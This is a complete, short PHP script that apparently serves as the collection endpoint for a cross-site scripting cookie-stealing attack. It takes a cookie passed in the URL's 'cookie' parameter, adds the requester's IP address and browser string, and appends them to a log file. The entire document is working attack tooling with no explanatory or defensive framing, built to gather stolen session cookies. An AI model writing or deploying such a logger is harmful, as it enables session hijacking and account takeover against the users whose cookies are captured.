<?php

$cookie = $_GET['cookie'];
$ip = $_SERVER['REMOTE_ADDR'];
$browser = $_SERVER['HTTP_USER_AGENT'];

$fp = fopen('log.txt', 'a');

fwrite($fp, 'ip: ' . $ip . "\n" . 'cookie: ' . $cookie . "\n" . 'broswer: ' . $browser . "\n __________________________ \n");

?>
